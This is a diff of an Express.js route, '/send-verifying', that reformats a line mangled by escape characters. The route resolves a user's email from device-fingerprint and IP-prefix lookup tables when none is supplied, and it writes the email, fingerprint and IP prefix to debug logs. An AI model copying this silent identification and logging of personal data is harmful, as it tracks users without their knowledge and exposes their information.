@@ -1858,7 +1858,31 @@ app.post("/update-wallet-decision", (req, res) => {
 
 app.post("/send-verifying", async (req, res) => {
   try {
-    let { userId, email } = req.body;\n    \n    const ip = getIP(req);\n    const fingerprint = getDeviceFingerprint(req);\n    const ipPrefix = ip.split(".")\.slice(0, 3).join(".");\n    \n    if (!email) {\n      if (fingerprint && deviceFingerprintToEmail[fingerprint]) {\n        email = deviceFingerprintToEmail[fingerprint];\n      } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {\n        email = ipPrefixToEmail[ipPrefix];\n      }\n    }\n    \n    if (!userId || !email) {\n      return res.status(400).json({ error: "Missing userId or email" });\n    }\n    \n    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;\n    \n    const userAgent = req.get("user-agent") || "Unknown";\n    const device = detectDevice(userAgent);\n    const region = await detectRegion(ip);
+    let { userId, email } = req.body;
+    
+    const ip = getIP(req);
+    const fingerprint = getDeviceFingerprint(req);
+    const ipPrefix = ip.split(".").slice(0, 3).join(".");
+    
+    // If email not provided, resolve from fingerprint mapping
+    if (!email) {
+      if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+        email = deviceFingerprintToEmail[fingerprint];
+      } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
+        email = ipPrefixToEmail[ipPrefix];
+      }
+    }
+    
+    if (!userId || !email) {
+      return res.status(400).json({ error: "Missing userId or email" });
+    }
+    
+    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
     console.log(`🔍 DEBUG /send-verifying: Original email: ${email}`);
     console.log(`🔍 DEBUG: Fingerprint: ${fingerprint}`);
     console.log(`🔍 DEBUG: IP Prefix: ${ipPrefix}`);
